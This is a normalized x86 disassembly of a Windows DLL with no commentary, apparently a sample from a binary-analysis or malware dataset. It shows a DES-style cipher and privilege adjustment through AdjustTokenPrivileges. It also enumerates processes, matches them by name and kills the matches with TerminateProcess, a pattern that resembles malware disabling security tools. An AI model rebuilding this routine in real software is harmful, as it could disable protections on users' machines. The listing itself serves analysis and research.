stosb [ edi ]
push edx
push rw-data
lea eax [ ebp - 0x28 ]
push rw-data
push eax
call [ sprintf@IAT ]
add esp 0x10
lea eax [ ebp - 0x28 ]
push eax
call [ OutputDebugStringA@IAT ]
jmp r-xdata
test [ ebx + 0xc ] 0x10
jne r-xdata
cmp [ ebp + 0x9 ] 0x34
jne r-xdata
xor eax eax
push ebx
call [ fclose@IAT ]
pop ecx
jmp r-xdata
cmp [ ebp + 0xa ] 0x5e
jne r-xdata
push ebx
push 0x4
push 0x1
lea eax [ ebp + 0x8 ]
pop edi
push edi
push eax
call esi
add esp 0x10
cmp [ ebp + 0x8 ] 0x1b
jne r-xdata
cmp [ ebp + 0xb ] 0x2d
je r-xdata
push ebx
push edi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
push ebx
push edi
lea eax [ ebp - 0x4 ]
push 0x4
push eax
call esi
push ebx
push edi
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
call esi
add esp 0x30
call [ GetLastError@IAT ]
and [ ebp - 0x28 ] 0x0
push 0x7
mov edx eax
pop ecx
xor eax eax
lea edi [ ebp - 0x27 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
push edx
push rw-data
lea eax [ ebp - 0x28 ]
push rw-data
push eax
call [ sprintf@IAT ]
add esp 0x10
lea eax [ ebp - 0x28 ]
push eax
call [ OutputDebugStringA@IAT ]
push ebx
call [ fclose@IAT ]
pop ecx
push 0x1
pop eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn 0xc
sub_1000459f
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
test ebx ebx
mov esi ecx
je r-xdata
xor al al
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
lea edi [ eax + 0x7 ]
and edi 0xfffffff8
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
call sub_10004667
cmp [ esi + 0x600 ] 0x0
jne r-xdata
sar edi 0x3
mov eax edi
test eax eax
jle r-xdata
sar edi 0x3
test edi edi
jle r-xdata
mov al 0x1
jmp r-xdata
cmp [ ebp + 0x1c ] 0x0
lea edi [ esi + 0x300 ]
mov [ ebp + 0x14 ] eax
sete [ ebp + 0x8 ]
push [ ebp + 0x1c ]
mov ecx esi
push esi
push [ ebp + 0xc ]
push ebx
call sub_100046d2
add [ ebp + 0xc ] 0x8
add ebx 0x8
dec edi
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x18
push [ ebp + 0x1c ]
mov ecx esi
push esi
push [ ebp + 0xc ]
push ebx
call sub_100046d2
push [ ebp + 0x8 ]
mov ecx esi
push edi
push ebx
push ebx
call sub_100046d2
push [ ebp + 0x1c ]
mov ecx esi
push esi
push ebx
push ebx
call sub_100046d2
add [ ebp + 0xc ] 0x8
add ebx 0x8
dec [ ebp + 0x14 ]
jne r-xdata
jmp r-xdata
sub_10004667
push esi
mov esi ecx
push edi
push 0x10
lea edi [ esi + 0x701 ]
push 0x0
push edi
call memset
add esp 0xc
cmp [ esp + 0x10 ] 0x10
jle r-xdata
mov eax [ esp + 0x10 ]
push 0x10
pop eax
jmp r-xdata
xor al al
lea eax [ esi + 0x709 ]
mov ecx esi
push eax
lea eax [ esi + 0x300 ]
push eax
call sub_100047ec
mov al 0x1
jmp r-xdata
push eax
push [ esp + 0x10 ]
push edi
call memcpy
add esp 0xc
mov ecx esi
push edi
push esi
call sub_100047ec
cmp [ esp + 0x10 ] 0x8
jle r-xdata
mov [ esi + 0x600 ] al
pop edi
pop esi
retn 0x8
sub_100046d2
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x40
push [ ebp + 0xc ]
mov edi rw-data
mov ebx ecx
push edi
call sub_100049bb
push 0x40
push r--data
push edi
push edi
mov ecx ebx
call sub_1000491a
cmp [ ebp + 0x14 ] 0x0
mov eax [ ebp + 0x10 ]
jne r-xdata
add eax 0x2d0
mov [ ebp + 0x10 ] 0x10
mov [ ebp + 0x14 ] eax
mov esi rw-data
mov [ ebp + 0x14 ] eax
mov [ ebp + 0x10 ] 0x10
mov esi rw-data
push 0x20
push [ rw-data ]
push esi
call memcpy
add esp 0xc
mov ecx ebx
push [ ebp + 0x14 ]
push [ rw-data ]
call sub_10004872
push 0x20
mov ecx ebx
push [ rw-data ]
push [ rw-data ]
call sub_1000495a
push 0x20
push esi
push [ rw-data ]
call memcpy
sub [ ebp + 0x14 ] 0x30
add esp 0xc
dec [ ebp + 0x10 ]
jne r-xdata
push 0x40
push r--data
push edi
push edi
mov ecx ebx
call sub_1000491a
push 0x40
push edi
push [ ebp + 0x8 ]
mov ecx ebx
call sub_100049ec
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
push 0x20
push [ rw-data ]
push esi
call memcpy
add esp 0xc
mov ecx ebx
push [ ebp + 0x14 ]
push [ rw-data ]
call sub_10004872
push 0x20
mov ecx ebx
push [ rw-data ]
push [ rw-data ]
call sub_1000495a
push 0x20
push esi
push [ rw-data ]
call memcpy
add [ ebp + 0x14 ] 0x30
add esp 0xc
dec [ ebp + 0x10 ]
jne r-xdata
jmp r-xdata
sub_100047ec
push ebx
push ebp
push esi
push edi
push 0x40
mov edi rw-data
push [ esp + 0x1c ]
mov ebx ecx
push edi
call sub_100049bb
push 0x38
push r--data
push edi
push edi
mov ecx ebx
call sub_1000491a
mov eax [ esp + 0x14 ]
xor ebp ebp
mov [ esp + 0x18 ] eax
movsx eax [ ebp + r--data ]
lea esi [ ebp + r--data ]
push eax
push 0x1c
mov ecx ebx
push [ rw-data ]
call sub_1000497a
movsx eax [ esi ]
push eax
push 0x1c
push [ rw-data ]
mov ecx ebx
call sub_1000497a
push 0x30
push r--data
push edi
mov ecx ebx
push [ esp + 0x24 ]
call sub_1000491a
add [ esp + 0x18 ] 0x30
inc ebp
cmp ebp 0x10
jl r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn 0x8
sub_10004872
push ebx
mov ebx [ esp + 0x8 ]
push esi
push edi
push 0x30
push r--data
mov esi rw-data
push ebx
mov edi ecx
push esi
call sub_1000491a
push 0x30
mov ecx edi
push [ esp + 0x18 ]
push esi
call sub_1000495a
push esi
push ebx
mov ecx edi
call sub_100048bb
push 0x20
push r--data
push ebx
push ebx
mov ecx edi
call sub_1000491a
pop edi
pop esi
pop ebx
retn 0x8
sub_100048bb
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
push 0x8
mov [ ebp - 0x4 ] ecx
xor edi edi
pop ebx
mov al [ esi + 0x1 ]
mov cl [ esi ]
shl al 0x1
add al [ esi + 0x2 ]
push 0x4
shl cl 0x1
add cl [ esi + 0x5 ]
shl al 0x1
add al [ esi + 0x3 ]
movsx ecx cl
shl al 0x1
add al [ esi + 0x4 ]
add ecx edi
shl ecx 0x4
movsx eax al
lea eax [ eax + ecx + r--data ]
mov ecx [ ebp - 0x4 ]
push eax
push [ ebp + 0x8 ]
call sub_100049bb
add [ ebp + 0x8 ] 0x4
add edi 0x4
add esi 0x6
dec ebx
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_1000491a
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x14 ] eax
jle r-xdata
push [ ebp + 0x14 ]
add ecx 0x601
push ecx
push [ ebp + 0x8 ]
call memcpy
add esp 0xc
pop ebp
retn 0x10
push esi
mov edx [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
movsx edx [ eax + edx ]
inc eax
mov dl [ edx + esi - 0x1 ]
cmp eax [ ebp + 0x14 ]
mov [ ecx + eax + 0x600 ] dl
jl r-xdata
pop esi
sub_1000495a
push esi
mov esi [ esp + 0x10 ]
test esi esi
jle r-xdata
pop esi
retn 0xc
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0xc ]
sub ecx eax
mov dl [ ecx + eax ]
xor [ eax ] dl
inc eax
dec esi
jne r-xdata
sub_1000497a
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0x18 ]
lea ebx [ ecx + 0x601 ]
push edi
push esi
push ebx
call memcpy
mov eax [ esp + 0x20 ]
sub eax edi
push eax
lea eax [ esi + edi ]
push eax
push esi
call memcpy
sub esi edi
push edi
add esi [ esp + 0x30 ]
push ebx
push esi
call memcpy
add esp 0x24
pop edi
pop esi
pop ebx
retn 0xc
sub_100049bb
xor eax eax
cmp [ esp + 0xc ] eax
jle r-xdata
retn 0xc
push esi
mov esi [ esp + 0xc ]
mov edx eax
sar edx 0x3
mov cl al
mov dl [ edx + esi ]
and cl 0x7
sar dl cl
mov ecx [ esp + 0x8 ]
and dl 0x1
mov [ eax + ecx ] dl
inc eax
cmp eax [ esp + 0x10 ]
jl r-xdata
pop esi
sub_100049ec
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push esi
sar eax 0x3
push edi
mov edi [ ebp + 0x8 ]
xor esi esi
push eax
push esi
push edi
call memset
add esp 0xc
cmp [ ebp + 0x10 ] esi
jle r-xdata
pop edi
pop esi
pop ebp
retn 0xc
mov edx [ ebp + 0xc ]
mov ecx esi
mov eax esi
and ecx 0x7
mov dl [ esi + edx ]
sar eax 0x3
shl dl cl
add eax edi
or [ eax ] dl
inc esi
cmp esi [ ebp + 0x10 ]
jl r-xdata
sub_10004a6e
push ebx
push ebp
push esi
mov esi ecx
push edi
mov edi 0x2000
cmp [ esi + 0x4 ] 0x0
mov ebp edi
jne r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push edi
call [ malloc@IAT ]
pop ecx
mov [ esi + 0x4 ] eax
pop edi
pop esi
pop ebp
pop ebx
retn
push 0x0
push edi
push eax
push 0x5
call [ esi ]
mov ebx 0xc0000004
add ebp edi
push ebp
push [ esi + 0x4 ]
call [ realloc@IAT ]
pop ecx
mov [ esi + 0x4 ] eax
pop ecx
push 0x0
push ebp
push eax
push 0x5
call [ esi ]
jmp r-xdata
cmp eax ebx
jne r-xdata
sub_10004ac4
push ebp
mov ebp esp
sub esp 0x414
push ebx
push esi
push edi
mov esi ecx
push 0x40
xor ebx ebx
pop ecx
xor eax eax
lea edi [ ebp - 0x20b ]
mov [ ebp - 0x20c ] bl
[ edi ]
stosw [ edi ]
stosb [ edi ]
push 0x40
xor eax eax
pop ecx
lea edi [ ebp - 0x107 ]
mov [ ebp - 0x108 ] bl
mov [ ebp - 0x1 ] bl
[ edi ]
stosw [ edi ]
mov ecx esi
stosb [ edi ]
call sub_10004a6e
mov edi 0x104
push 0x208
lea eax [ ebp - 0x414 ]
push ebx
push eax
call memset
push edi
lea eax [ ebp - 0x108 ]
push ebx
push eax
call memset
add esp 0x18
lea eax [ ebp - 0x414 ]
mov ecx esi
push eax
mov eax [ esi + 0x4 ]
push [ eax + 0x44 ]
call sub_10004cc6
push ebx
push ebx
lea eax [ ebp - 0x20c ]
push edi
push eax
mov eax [ esi + 0x4 ]
push 0xffffffff
push [ eax + 0x3c ]
push ebx
push ebx
call [ WideCharToMultiByte@IAT ]
lea eax [ ebp - 0x20c ]
push eax
mov eax [ esi + 0x4 ]
push [ eax + 0x44 ]
lea eax [ ebp - 0x108 ]
push rw-data
push eax
call [ sprintf@IAT ]
lea eax [ ebp - 0x108 ]
push eax
push [ ebp + 0x8 ]
call strcat
push edi
lea eax [ ebp - 0x108 ]
push ebx
push eax
call memset
lea eax [ ebp - 0x310 ]
push eax
call strlen
add esp 0x28
test eax eax
lea eax [ ebp - 0x414 ]
push eax
je r-xdata
mov [ ebp - 0x1 ] 0x1
lea eax [ ebp - 0x108 ]
push rw-data
push eax
call [ sprintf@IAT ]
add esp 0xc
lea eax [ ebp - 0x310 ]
push eax
lea eax [ ebp - 0x108 ]
push rw-data
push eax
call [ sprintf@IAT ]
add esp 0x10
jmp r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax ] ebx
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x4
lea eax [ ebp - 0x108 ]
push eax
push [ ebp + 0x8 ]
call strcat
mov eax [ esi + 0x4 ]
pop ecx
pop ecx
mov ecx [ eax ]
add ecx eax
cmp [ ebp - 0x1 ] bl
mov [ esi + 0x4 ] ecx
je r-xdata
sub_10004c42
push ebp
mov ebp esp
sub esp 0x1c
lea eax [ ebp - 0x4 ]
push esi
push eax
push 0x20028
call [ GetCurrentProcess@IAT ]
push eax
call [ OpenProcessToken@IAT ]
test eax eax
je r-xdata
pop esi
leave
retn 0x8
lea eax [ ebp - 0xc ]
xor esi esi
push eax
push [ ebp + 0x8 ]
push esi
call [ LookupPrivilegeValueA@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0xc ]
push esi
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0xc ]
neg eax
sbb eax eax
push esi
and eax 0x2
push esi
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x1c ]
push eax
push esi
push [ ebp - 0x4 ]
mov [ ebp - 0x1c ] 0x1
call [ AdjustTokenPrivileges@IAT ]
push [ ebp - 0x4 ]
call [ CloseHandle@IAT ]
call [ GetLastError@IAT ]
neg eax
sbb eax eax
inc eax
push 0x1
pop eax
jmp r-xdata
sub_10004cc6
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x34
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x4 ] ebx
push [ ebp + 0x8 ]
push ebx
push 0x400
call [ OpenProcess@IAT ]
mov [ ebp - 0x1c ] eax
cmp eax ebx
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
call sub_10004dbb
xor ebx ebx
cmp [ ebp - 0x1c ] ebx
je r-xdata
lea ecx [ ebp - 0x28 ]
push ecx
push 0x8
push eax
call [ OpenProcessToken@IAT ]
mov [ ebp - 0x20 ] eax
cmp eax ebx
je r-xdata
cmp [ ebp - 0x28 ] ebx
je r-xdata
push [ ebp - 0x1c ]
call [ CloseHandle@IAT ]
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x30 ]
push eax
push ebx
push ebx
push 0x1
push [ ebp - 0x28 ]
mov esi [ GetTokenInformation@IAT ]
call esi
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x30 ]
add eax eax
push eax
call ??2@YAPAXI@Z
pop ecx
mov edi eax
mov [ ebp - 0x40 ] edi
mov [ ebp - 0x24 ] edi
mov eax [ ebp - 0x30 ]
add eax eax
mov [ ebp - 0x30 ] eax
lea ecx [ ebp - 0x30 ]
push ecx
push eax
push edi
push 0x1
push [ ebp - 0x28 ]
call esi
mov [ ebp - 0x20 ] eax
call [ GetLastError@IAT ]
mov [ ebp - 0x3c ] eax
cmp [ ebp - 0x20 ] ebx
je r-xdata
cmp [ ebp - 0x24 ] ebx
je r-xdata
push [ ebp - 0x28 ]
call [ CloseHandle@IAT ]
mov eax 0x104
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] eax
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x34 ]
push eax
mov eax [ ebp + 0xc ]
lea ecx [ eax + 0x104 ]
push ecx
lea ecx [ ebp - 0x38 ]
push ecx
push eax
push [ edi ]
push ebx
call [ LookupAccountSidA@IAT ]
mov [ ebp - 0x20 ] eax
mov esp [ ebp - 0x18 ]
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x8
push [ ebp - 0x24 ]
call ??3@YAXPAX@Z
pop ecx
sub_10004dbb
cmp [ ebp - 0x1c ] ebx
je r-xdata
cmp [ ebp - 0x28 ] ebx
je r-xdata
push [ ebp - 0x1c ]
call [ CloseHandle@IAT ]
cmp [ ebp - 0x24 ] ebx
je r-xdata
push [ ebp - 0x28 ]
call [ CloseHandle@IAT ]
mov esp [ ebp - 0x18 ]
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x8
push [ ebp - 0x24 ]
call ??3@YAXPAX@Z
pop ecx
sub_10004dfc
push ebx
push ebp
push esi
push edi
push 0x1
mov esi rw-data
pop ebx
mov ebp ecx
push ebx
push esi
call sub_10004c42
push [ esp + 0x14 ]
push ebx
push 0x1f0fff
call [ OpenProcess@IAT ]
mov edi eax
test edi edi
je r-xdata
push edi
call [ CloseHandle@IAT ]
push 0x0
push esi
mov ecx ebp
call sub_10004c42
pop edi
pop esi
mov eax ebx
pop ebp
pop ebx
retn 0x4
push 0x0
push edi
call [ TerminateProcess@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
push 0x1f4
call [ Sleep@IAT ]
sub_10004e5b
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
push edi
mov esi ecx
call sub_10004a6e
xor ebx ebx
push 0x208
mov [ ebp - 0x8 ] ebx
call ??2@YAPAXI@Z
pop ecx
mov edi [ MultiByteToWideChar@IAT ]
push ebx
push ebx
push 0xffffffff
mov [ ebp - 0x4 ] eax
push [ ebp + 0x8 ]
mov [ ebp - 0xc ] ebx
push ebx
push ebx
call edi
push eax
push [ ebp - 0x4 ]
push 0xffffffff
push [ ebp + 0x8 ]
push ebx
push ebx
call edi
cmp [ eax + 0x3c ] ebx
jne r-xdata
mov [ ebp - 0x8 ] 0x1
mov eax [ esi + 0x4 ]
push 0x4
push [ eax + 0x3c ]
push [ ebp - 0x4 ]
call [ _wcsnicmp@IAT ]
add esp 0xc
test eax eax
jne r-xdata
add ecx eax
mov [ esi + 0x4 ] ecx
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
add ecx eax
cmp [ ebp - 0x8 ] ebx
mov [ esi + 0x4 ] ecx
je r-xdata
mov eax [ esi + 0x4 ]
mov ecx esi
push [ eax + 0x44 ]
call sub_10004dfc
mov [ ebp - 0xc ] eax
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
cmp ecx ebx
jne r-xdata
push [ ebp - 0x4 ]
call ??3@YAXPAX@Z
mov eax [ ebp - 0xc ]
pop ecx
pop edi
pop esi
pop ebx
leave
retn 0x4
sub_10001000
call sub_1000100a
jmp sub_10001014
sub_1000100a
mov ecx rw-data
jmp sub_10004465
sub_10001014
push sub_10001020
call sub_10002e42
pop ecx
retn
sub_10001020
mov ecx rw-data
jmp sub_1000459e
sub_1000102a
call sub_10001034
jmp sub_1000103e
sub_10001034
mov ecx rw-data
jmp sub_1000459b
sub_1000103e
push sub_1000104a
call sub_10002e42
pop ecx
retn
sub_1000104a
mov ecx rw-data
jmp sub_1000459e
sub_10001054
call sub_1000105e
jmp sub_10001068
sub_1000105e
mov ecx rw-data
jmp sub_10004a2e
sub_10001068
push sub_10001074
call sub_10002e42
pop ecx
retn
sub_10001074
mov ecx rw-data
jmp sub_10004a3c
sub_1000107e
call sub_10001088
jmp sub_10001092
sub_10001088
mov ecx rw-data
jmp sub_10004a2e
sub_10001092
push sub_1000109e
call sub_10002e42
pop ecx
retn
sub_1000109e
mov ecx rw-data
jmp sub_10004a3c
sub_1000188e
push [ rw-data ]
call [ SetEvent@IAT ]
retn
sub_1000189b
push 0x0
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call [ recv@IAT ]
retn
sub_10001a51
mov ecx rw-data
call sub_10004a4c
mov eax r-xdata
retn
sub_10001a61
push [ rw-data ]
call [ SetEvent@IAT ]
retn
sub_10001a6e
fld [ r--data ]
push [ rw-data ]
mov [ rw-data ] 0x1
fstp [ rw-data ]
call [ SetEvent@IAT ]
retn
sub_10002350
push esi
mov esi rw-data
mov ecx esi
call [ std::basic_fstream<char,struct std::char_traits<char> >::~basic_fstream<char,struct std::char_traits<char> >@IAT ]
mov ecx esi
call [ std::basic_ios<char,struct std::char_traits<char> >::~basic_ios<char,struct std::char_traits<char> >@IAT ]
pop esi
retn
sub_10002e16
cmp [ rw-data ] 0xffffffff
jne r-xdata
push rw-data
push rw-data
push [ esp + 0xc ]
call __dllonexit
add esp 0xc
retn
push [ esp + 0x4 ]
call [ _onexit@IAT ]
pop ecx
retn
sub_10002e42
push [ esp + 0x4 ]
call sub_10002e16
neg eax
sbb eax eax
pop ecx
neg eax
dec eax
retn
__CxxFrameHandler
jmp [ __CxxFrameHandler@IAT ]
_EH_prolog
jmp [ _EH_prolog@IAT ]
strlen
jmp [ strlen@IAT ]
strcpy
jmp [ strcpy@IAT ]
abs
jmp [ abs@IAT ]
_ftol
jmp [ _ftol@IAT ]
__dllonexit
jmp [ __dllonexit@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_10003026
push esi
mov esi ecx
and [ esi + 0x2c ] 0x0
and [ esi + 0x20 ] 0x0
call sub_10003eb6
mov eax esi
pop esi
retn
sub_100030b1
mov ecx [ ebp - 0x14 ]
push 0x1
call sub_100040ca
push 0x0
push 0x0
call _CxxThrowException
sub_100032d1
push esi
mov esi ecx
call sub_100032ed
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
pop ecx
sub_100032ed
mov [ ecx ] r--data
push 0x1
add ecx 0x8
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
retn
sub_10004182
push esi
mov esi ecx
cmp [ esi + 0x1c ] 0x0
je r-xdata
pop esi
retn
mov eax [ esi + 0xc ]
push [ esi + 0x18 ]
call [ eax + 0x40 ]
and [ esi + 0x18 ] 0x0
sub_1000419a
mov eax [ esp + 0x4 ]
push esi
lea eax [ eax + eax * 2 + 0x6 ]
push [ ecx + eax * 4 ]
lea esi [ ecx + eax * 4 ]
mov eax [ ecx + 0xc ]
call [ eax + 0x40 ]
and [ esi ] 0x0
pop esi
retn 0x4
sub_1000423b
mov eax [ ecx + 0x4 ]
retn
sub_10004465
push esi
mov esi ecx
push 0x42c
push 0x0
push esi
call memset
add esp 0xc
mov eax esi
pop esi
retn
sub_1000459b
mov eax ecx
retn
sub_1000459e
retn
sub_10004a2e
push esi
mov esi ecx
push esi
call [ InitializeCriticalSection@IAT ]
mov eax esi
pop esi
retn
sub_10004a3c
push ecx
call [ DeleteCriticalSection@IAT ]
retn
sub_10004a44
push ecx
call [ EnterCriticalSection@IAT ]
retn
sub_10004a4c
push ecx
call [ LeaveCriticalSection@IAT ]
retn
sub_10004a54
mov eax ecx
and [ eax ] 0x0
and [ eax + 0x4 ] 0x0
retn
sub_10004a5e
cmp [ ecx + 0x4 ] 0x0
jne r-xdata
retn
push 0x0
call [ free@IAT ]
pop ecx
sub_10004c1f
push esi
mov esi ecx
cmp [ esi ] 0x0
jne r-xdata
pop esi
retn
push rw-data
push rw-data
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
mov [ esi ] eax
GetSystemPowerStatus
jmp [ GetSystemPowerStatus@IAT ]
sub_10004f16
push esi
mov esi ecx
call ??1type_info@@UAE@XZ
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call ??3@YAXPAX@Z
pop ecx
_CxxThrowException
jmp [ _CxxThrowException@IAT ]
_except_handler3
jmp [ _except_handler3@IAT ]
??1type_info@@UAE@XZ
jmp [ type_info::~type_info@IAT ]
sub_10004f44
push [ ebp - 0x110 ]
call ??3@YAXPAX@Z
pop ecx
retn
sub_10004f51
mov eax r--data
jmp __CxxFrameHandler
sub_10004f5c
mov eax r--data
jmp __CxxFrameHandler
sub_10004f68
lea ecx [ ebp - 0xa4 ]
jmp [ std::basic_fstream<char,struct std::char_traits<char> >::`vector deleting destructor'@IAT ]
sub_10004f74
mov eax r--data
jmp __CxxFrameHandler
sub_10004f80
lea ecx [ ebp - 0x14 ]
jmp sub_10004a5e
sub_10004f88
mov eax r--data
jmp __CxxFrameHandler
sub_10004f94
lea ecx [ ebp - 0x14 ]
jmp sub_10004a5e
sub_10004f9c
mov eax r--data
jmp __CxxFrameHandler
sub_10004fa8
mov eax r--data
jmp __CxxFrameHandler
sub_10004fb4
lea ecx [ ebp - 0x48 ]
jmp sub_10004182
sub_10004fbc
push [ ebp - 0x18 ]
call ??3@YAXPAX@Z
pop ecx
retn
sub_10004fc6
push [ ebp - 0x14 ]
call ??3@YAXPAX@Z
pop ecx
retn
sub_10004fd0
mov eax r--data
jmp __CxxFrameHandler
sub_10004fdc
lea ecx [ ebp + 0x8 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_10004fe5
mov eax r--data
jmp __CxxFrameHandler
sub_10004ff0
lea ecx [ ebp + 0x8 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_10004ff9
mov eax r--data
jmp __CxxFrameHandler
sub_10005004
lea ecx [ ebp + 0x8 ]
jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub_1000500d
mov eax r--data
jmp __CxxFrameHandler
sub_10005018
lea ecx [ ebp - 0x3c ]
jmp sub_100041b6
sub_10005020
lea ecx [ ebp - 0x5c ]
jmp sub_10004182
sub_10005028
push [ ebp + 0x8 ]
call ??3@YAXPAX@Z
pop ecx
retn
sub_10005032
push [ ebp + 0x8 ]
call ??3@YAXPAX@Z
pop ecx
retn
sub_1000503c
push [ ebp + 0x8 ]
call ??3@YAXPAX@Z
pop ecx
retn
sub_10005046
mov eax r--data
jmp __CxxFrameHandler
sub_10005050
push [ ebp - 0x10 ]
call ??3@YAXPAX@Z
pop ecx
retn
sub_1000505a
mov eax r--data
jmp __CxxFrameHandler
sub_10005064
lea ecx [ ebp - 0x4c ]
jmp sub_10004182
sub_1000506c
push [ ebp - 0x1c ]
call ??3@YAXPAX@Z
pop ecx
retn
sub_10005076
push [ ebp - 0x20 ]
call ??3@YAXPAX@Z
pop ecx
retn
sub_10005080
push [ ebp - 0x20 ]
call ??3@YAXPAX@Z
pop ecx
retn
sub_1000508a
mov eax r--data
jmp __CxxFrameHandler
sub_10005094
lea ecx [ ebp - 0x6c ]
jmp sub_100041dc
sub_1000509c
push [ ebp + 0x8 ]
call ??3@YAXPAX@Z
pop ecx
retn
sub_100050a6
push [ ebp - 0x10 ]
call ??3@YAXPAX@Z
pop ecx
retn
sub_100050b0
push [ ebp - 0x14 ]
call ??3@YAXPAX@Z
pop ecx
retn
sub_100050ba
mov eax r--data
jmp __CxxFrameHandler
sub_100050c4
push [ ebp - 0x14 ]
call ??3@YAXPAX@Z
pop ecx
retn
sub_100050ce
lea ecx [ ebp - 0x68 ]
jmp sub_100041dc
sub_100050d6
push [ ebp - 0x18 ]
call ??3@YAXPAX@Z
pop ecx
retn
sub_100050e0
push [ ebp - 0x18 ]
call ??3@YAXPAX@Z
pop ecx
retn
sub_100050ea
mov eax r--data
jmp __CxxFrameHandler
sub_100050f4
push [ ebp - 0x1c ]
call ??3@YAXPAX@Z
pop ecx
retn
sub_100050fe
push [ ebp - 0x1c ]
call ??3@YAXPAX@Z
pop ecx
retn
sub_10005108
mov eax r--data
jmp __CxxFrameHandler
sub_10005114
push [ ebp - 0x14 ]
call ??3@YAXPAX@Z
pop ecx
retn
sub_1000511e
mov eax r--data
jmp __CxxFrameHandler
